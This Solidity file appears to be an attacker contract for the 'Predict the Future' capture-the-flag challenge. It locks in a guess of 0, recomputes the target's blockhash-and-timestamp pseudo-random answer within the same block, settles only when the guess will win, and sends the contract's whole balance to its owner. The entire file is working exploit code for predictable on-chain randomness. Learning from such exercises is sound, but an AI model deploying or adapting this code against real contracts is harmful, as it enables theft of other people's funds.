// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.6;
	
interface TargetInterface {
	function lockInGuess(uint8) external payable;
		
	function settle() external;

	function isComplete() external returns (bool);
}

contract PredictTheFuture {
	address owner;
	TargetInterface target;
	uint8 constant targetOutcome = 0;

	constructor(address _targetAddress) {
		owner = msg.sender;
		target = TargetInterface(_targetAddress);

	}

	function setup() public payable {
		require(msg.value == 1 ether, "value != 1 ether");
		target.lockInGuess{value: 1 ether}(targetOutcome);	
	}

	function win() public {
		uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
		require(answer == targetOutcome, "answer is not targetOutcome");
		target.settle();
		require(target.isComplete(), "isComplete failed");
	}

	function claimFunds() public {
		payable(owner).transfer(address(this).balance);
	}

	receive() external payable {}
}
